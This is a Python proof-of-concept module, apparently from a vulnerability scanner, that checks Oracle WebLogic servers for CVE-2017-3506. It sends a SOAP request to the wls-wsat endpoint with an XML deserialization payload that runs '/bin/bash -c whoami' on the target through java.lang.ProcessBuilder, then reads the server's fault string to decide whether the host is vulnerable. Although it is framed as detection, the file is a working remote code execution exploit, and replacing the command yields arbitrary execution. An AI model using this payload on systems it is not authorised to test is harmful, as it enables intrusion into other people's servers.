# -*- encoding: utf-8 -*-
'''
@File : CVE_2017_3506.py
@Time : 2019/09/30 14:02:27
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''


import sys
import requests
import re
from lib import *

VUL=['CVE-2017-3506']
headers = {'user-agent': 'ceshi/0.0.1'}

def poc(url,index):
    rurl=url
    if not url.startswith("http"):
        url = "http://" + url
    if "/" in url:
        url += '/wls-wsat/CoordinatorPortType'
    post_str = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
				<void index="2">
                  <string>whoami</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''

    try:
        response = requests.post(url, data=post_str, verify=False, timeout=5, headers=headers)
        response = response.text
        response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
    except Exception:
        response = ""

    if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
        print(Vcolors.RED+ '\t检测JAVA deserialization漏洞(CVE-2017-3506)\n\t'+Vcolors.ENDC)
        a = url+":7001:检测JAVA deserialization漏洞(CVE-2017-3506)"
        return a
    else:
        pass


def run(rip,rport,index):
    url=rip+':'+str(rport)
    poc(url=url,index=index)
